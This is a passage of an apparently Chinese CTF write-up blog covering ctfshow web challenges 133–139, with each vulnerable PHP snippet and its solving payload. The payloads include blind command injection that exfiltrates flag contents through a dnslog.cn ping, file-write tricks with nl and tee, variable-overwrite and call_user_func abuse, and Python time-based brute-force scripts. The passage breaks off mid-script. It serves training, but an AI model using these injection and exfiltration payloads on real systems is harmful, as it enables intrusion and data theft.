class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">å…ˆè®¿é—®robots.txtåœ¨è®¿é—®adminæ‹¿åˆ°æºç </span><br><span class="line">è€ƒç‚¹:é€»è¾‘ä¼˜å…ˆçº§æ¯”è¾ƒ</span><br><span class="line">å› ä¸º&amp;&amp;çš„ä¼˜å…ˆçº§æ¯”||é«˜.</span><br><span class="line">å› æ­¤å…ˆè®¡ç®—&amp;&amp;å†è®¡ç®—||.</span><br><span class="line">åªè¦||æˆç«‹å³å¯</span><br><span class="line"><span class="comment">//payload:?username=admin&amp;password=1&amp;code=admin</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-133-æ— å›æ˜¾çš„RCEï¼Œå‘½ä»¤é‡æ„é€ "><a href="#web-133-æ— å›æ˜¾çš„RCEï¼Œå‘½ä»¤é‡æ„é€ " class="headerlink" title="web 133:æ— å›æ˜¾çš„RCEï¼Œå‘½ä»¤é‡æ„é€ "></a>web 133:æ— å›æ˜¾çš„RCEï¼Œå‘½ä»¤é‡æ„é€ </h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6ä¸ªå­—æ¯éƒ½è¿˜ä¸å¤Ÿå‘€?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">åˆæ˜¯çŸ¥è¯†ç‚¹å¤šçš„ä¸€é“é¢˜.</span><br><span class="line"> </span><br><span class="line"><span class="number">1</span>.</span><br><span class="line">å…ˆçœ‹è¿™ä¸ªsubstrå®ƒæ˜¯å¯¹æˆ‘ä»¬çš„è¾“å…¥å‚æ•°è¿›è¡Œäº†æˆªæ–­.ä½†æ²¡æœ‰é‡æ–°èµ‹å€¼.</span><br><span class="line">é‚£ä¹ˆå¦‚æœæˆ‘ä»¬ä¼ å…¥ F=`<span class="variable">$F</span>`; system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">è¿›å…¥æˆªæ–­ä¼šå˜æˆ `<span class="variable">$F</span>`; </span><br><span class="line">ä½†æ˜¯<span class="variable">$F</span>åˆç­‰äº `<span class="variable">$F</span>`; system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">é‚£ä¹ˆä¹Ÿå°±æ˜¯ä¼šå˜æˆ``<span class="variable">$F</span>`; system(<span class="string">&quot;ls&quot;</span>);`</span><br><span class="line">è¿™æ ·å­å°±ç»•è¿‡äº†æˆ‘ä»¬çš„æˆªæ–­</span><br><span class="line"> </span><br><span class="line"><span class="number">2</span>.å¸¦å‡ºflag.</span><br><span class="line"> è¿™é‡Œæ¨¡å¼æ¯”è¾ƒå›ºå®šäº†.å°±æ˜¯åˆ©ç”¨dnslog.cnå¸¦å‡ºæˆ‘ä»¬çš„å›æ˜¾å†…å®¹</span><br><span class="line"> å› ä¸ºæˆ‘ä»¬``æ˜¯æ²¡æœ‰å›æ˜¾çš„.å› æ­¤éœ€è¦åˆ©ç”¨å…¶ä»–æ–¹å¼å¸¦å‡ºflag</span><br><span class="line"> ä¸‹é¢æ˜¯ç¾¤ä¸»ç»™çš„Payload</span><br><span class="line"> å…ˆå°è¯• ping `cat flag.php`<span class="number">.686</span>uw4.dnslog.cn -c </span><br><span class="line"> æ²¡æœ‰å›æ˜¾,å› ä¸ºè¿™ä¸ªå¤´éƒ¨æœ‰å­—ç¬¦æ•°é™åˆ¶.å› æ­¤é‡‡ç”¨ä¸€ä¸ªè¿‡æ»¤</span><br><span class="line"> æˆ‘ä»¬çŸ¥é“flagæ˜¯ctfshowå½¢å¼</span><br><span class="line"> é‚£ä¹ˆåˆ©ç”¨å‘½ä»¤ ping `cat flag.php | grep ctfshow`<span class="number">.686</span>uw4.dnslog.cn -c <span class="number">1</span> å³å¯</span><br><span class="line"> ?F=`<span class="variable">$F</span>`; ping `cat flag.php | grep ctfshow | tr -dc <span class="string">&quot;[a-z]&quot;</span>/<span class="string">&quot;[0-9]&quot;</span>`<span class="number">.686</span>uw4.dnslog.cn -c <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/16/nMbk36uqepSGcsW.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210916204127878">     </p><h1 id="web-134-parse-strä¸extracté…åˆä½¿ç”¨"><a href="#web-134-parse-strä¸extracté…åˆä½¿ç”¨" class="headerlink" title="web 134:parse_strä¸extracté…åˆä½¿ç”¨"></a>web 134:parse_strä¸extracté…åˆä½¿ç”¨</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@parse_str(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; <span class="variable">$key2</span> == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line">parse_str:å°†æŸ¥è¯¢çš„å­—ç¬¦ä¸²ä»¥åŠ å…¥å˜é‡ä¸­.</span><br><span class="line"> parse_str(<span class="string">&quot;a=k1he&quot;</span>)---&gt;ç»“æœæ˜¯:<span class="variable">$a</span>=k1he</span><br><span class="line"> </span><br><span class="line">extract:å°†æ•°ç»„ä¸­çš„é”®å€¼å¯¹ä»¥å˜é‡å½¢å¼è¿”å›.</span><br><span class="line"> extract(a[hacker]=k1he)---&gt;ç»“æœæ˜¯<span class="variable">$hacker</span>=k1he</span><br><span class="line"> </span><br><span class="line">é‚£ä¹ˆæ„é€ payload:</span><br><span class="line">  <span class="comment">//payload:?_POST[key1]=36d&amp;_POST[key2]=36d</span></span><br><span class="line">ç»è¿‡Parse_strä¼šå˜æˆ<span class="variable">$_POST</span>[key1]=<span class="number">36</span>d&amp;<span class="variable">$_POST</span>[key2]=<span class="number">36</span>d</span><br><span class="line">ç»è¿‡extractä¼šå˜æˆ:<span class="variable">$key1</span>=<span class="number">36</span>d&amp;<span class="variable">$key2</span>=<span class="number">36</span>d</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-135-web133åŠ å¼º"><a href="#web-135-web133åŠ å¼º" class="headerlink" title="web 135:web133åŠ å¼º"></a>web 135:web133åŠ å¼º</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¸ˆå‚…ä»¬å±…ç„¶ç ´è§£äº†å‰é¢çš„ï¼Œé‚£å°±æ¥ä¸€ä¸ªåŠ å¼ºç‰ˆå§&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">çœ‹è¿‡ç¾¤ä¸»çš„<span class="comment"># web 133çš„è§†é¢‘.</span></span><br><span class="line">å…ˆç”¨touch <span class="number">1</span>æµ‹è¯•ä¸€ä¸‹æ˜¯å¦æœ‰å†™æ–‡ä»¶çš„æƒé™.</span><br><span class="line">å‘ç°æœ‰.é‚£ä¹ˆç®€å•äº†</span><br><span class="line"> </span><br><span class="line"><span class="comment">//payload:?`$F`; nl f*&gt;a.txt</span></span><br><span class="line">è®¿é—® a.txtå³å¯</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-136-teeå‘½ä»¤çš„ä½¿ç”¨"><a href="#web-136-teeå‘½ä»¤çš„ä½¿ç”¨" class="headerlink" title="web 136:teeå‘½ä»¤çš„ä½¿ç”¨"></a>web 136:teeå‘½ä»¤çš„ä½¿ç”¨</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\# |\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    check(<span class="variable">$c</span>);</span><br><span class="line">    exec(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">çœ‹è¿‡ç¾¤ä¸»çš„<span class="comment"># web 133çš„è§†é¢‘.</span></span><br><span class="line">å…ˆç”¨touch <span class="number">1</span>æµ‹è¯•ä¸€ä¸‹æ˜¯å¦æœ‰å†™æ–‡ä»¶çš„æƒé™.</span><br><span class="line">è¿™é¢˜è€ƒå¯Ÿçš„æ˜¯teeå‘½ä»¤çš„ç”¨æ³•</span><br><span class="line">teeæŒ‡ä»¤ä¼šä»æ ‡å‡†è¾“å…¥è®¾å¤‡è¯»å–æ•°æ®ï¼Œå°†å…¶å†…å®¹è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ï¼ŒåŒæ—¶ä¿å­˜æˆæ–‡ä»¶ã€‚</span><br><span class="line"><span class="comment">//payload :ls|tee a</span></span><br><span class="line"><span class="comment"># åªæœ‰index.php</span></span><br><span class="line"><span class="comment">//payload:ls /|tee b</span></span><br><span class="line"><span class="comment"># æ‹¿åˆ°flagæ–‡ä»¶åf149_15_h3r3</span></span><br><span class="line"><span class="comment">//payload:nl /f149_15_h3r3|tee c</span></span><br><span class="line"><span class="comment"># ctfshow&#123;6211d0f3-9b65-4c11-ba8f-e736401e9e19&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-137-å¤–éƒ¨é™æ€æ–¹æ³•å¼•ç”¨"><a href="#web-137-å¤–éƒ¨é™æ€æ–¹æ³•å¼•ç”¨" class="headerlink" title="web 137:å¤–éƒ¨é™æ€æ–¹æ³•å¼•ç”¨"></a>web 137:å¤–éƒ¨é™æ€æ–¹æ³•å¼•ç”¨</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"> </span><br><span class="line">æœ¬é¢˜ä¸»è¦è€ƒå¯Ÿé™æ€æ–¹æ³•çš„è°ƒç”¨.</span><br><span class="line"><span class="comment">//payload:POST:ctfshow=ctfshow::getFlag</span></span><br><span class="line">åœ¨ç±»ä¸­:-&gt;ä¸::æ²¡æœ‰åŒºåˆ«</span><br><span class="line">ä½†æ˜¯åœ¨å¤–éƒ¨æ¡ä»¶ä¸‹,-&gt;åªèƒ½å¼•ç”¨ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡é‡Œçš„æ–¹æ³•</span><br><span class="line">::å´å¯ä»¥å¼•ç”¨ä¸€ä¸ªé™æ€æ–¹æ³•</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-138-call-user-funcä¼ é€’æ•°ç»„"><a href="#web-138-call-user-funcä¼ é€’æ•°ç»„" class="headerlink" title="web 138:call_user_funcä¼ é€’æ•°ç»„"></a>web 138:call_user_funcä¼ é€’æ•°ç»„</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;private class&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(strripos(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>], <span class="string">&quot;:&quot;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;private function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">call_user_func(<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"> </span><br><span class="line">åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šï¼Œè¿‡æ»¤äº†:</span><br><span class="line">è¿™æ—¶å€™å°±è€ƒçš„æ˜¯call_user_funcçš„ä½¿ç”¨äº†ã€‚</span><br><span class="line">call_user_func(<span class="keyword">array</span>(<span class="variable">$classname</span>,<span class="string">&#x27;good_boy&#x27;</span>))</span><br><span class="line">é‚£ä¹ˆä¼šè°ƒç”¨classnameé‡Œé¢çš„good_boyæ–¹æ³•</span><br><span class="line"> </span><br><span class="line"><span class="comment">//payload:ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-139-å‘½ä»¤ç›²æ‰“"><a href="#web-139-å‘½ä»¤ç›²æ‰“" class="headerlink" title="web 139:å‘½ä»¤ç›²æ‰“"></a>web 139:å‘½ä»¤ç›²æ‰“</h1><p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/16/RjSHahPVIeb56rL.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210916204140515"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\\$|\.|\!|\@|\# |\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    check(<span class="variable">$c</span>);</span><br><span class="line">    exec(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">çŸ¥è¯†ç‚¹å¦‚å›¾æ‰€ç¤ºäº†ã€‚ä¸»è¦å°±æ˜¯LINUXä¸‹<span class="keyword">if</span>è¯­å¥çš„ç”¨æ³•ã€‚</span><br><span class="line">å¹¶ä¸”é‡‡ç”¨æ—¶é—´ç›²æ³¨çš„æ€æƒ³ã€‚</span><br><span class="line"><span class="keyword">if</span>è¯­å¥ï¼š<span class="keyword">if</span>[æ¡ä»¶];ä¸ºçœŸæ—¶è¯­å¥;ä¸ºå‡æ—¶è¯­å¥ã€‚</span><br><span class="line">çˆ†ç ´æ–‡ä»¶åï¼š</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#  @Author: k1he</span></span><br><span class="line"><span class="comment">#  @Date:   2021-08-21 14:07:49</span></span><br><span class="line"><span class="comment">#  @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment">#  @Last Modified time: 2021-08-21 22:43:11</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="built_in">str</span>=string.ascii_letters+string.digits  <span class="comment"># ç”Ÿæˆæ‰€æœ‰å­—æ¯ä¸æ•°å­—[a-zA-Z0-9]</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,<span class="number">7</span>):</span><br><span class="line">    key=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">        <span class="keyword">if</span> key==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">            payload=<span class="string">&quot;if [ `ls /|awk &#x27;NR==&#123;0&#125;&#x27;|cut -c &#123;1&#125;` == &#123;2&#125; ];then sleep 3;fi&quot;</span>.<span class="built_in">format</span>(i,j,n)</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            url=<span class="string">&quot; http://d9ec8a51-8464-41de-aeb4-a3379e5177a4.challenge.ctf.show:8080/?c=&quot;</span>+payload</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url,timeout=(<span class="number">2.5</span>,<span class="number">2.5</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result=result+n</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> n==<span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">                key=<span class="number">1</span></span><br><span class="line">    result+=<span class="string">&quot; &quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">çˆ†ç ´flagï¼š<span class="comment">#  -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#  @Author: k1he</span></span><br><span class="line"><span class="comment">#  @Date:   2021-08-21 22:44:53</span></span><br><span class="line"><span class="comment">#  @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment">#  @Last Modified time: 2021-08-21 22:45:05</span></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import <span class="keyword">string</span></span><br><span class="line">str=<span class="keyword">string</span>.digits+<span class="keyword">string</span>.ascii_lowercase+<span class="string">&quot;-&quot;</span><span class="comment"># è·å–å°å†™å­—æ¯ä¸æ•°å­—</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line">key=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j in range(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">print</span>(j)</span><br><span class="line">    <span class="keyword">if</span> key==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> n in str:</span><br><span class="line">        payload=<span class="string">&quot;if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;</span>.format(j,n)</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        url=<span class="string">&quot;http://d9ec8a51-8464-41de-aeb4-a3379e5177a4.challenge.ctf.show:8080?c=&quot;</span>+payload</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(url,timeout=(<span class="number">2.5</span>,<span class="number">2.5</span>)) <span class="comment"># time()ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å“åº”æ—¶é—´ï¼Œç¬¬äºŒä¸ªæ˜¯è¯»å–æ—¶é—´</span></span><br><span class="line">        except:</span><br><span class="line">            result=result+n</span><br><span class="line">            <span 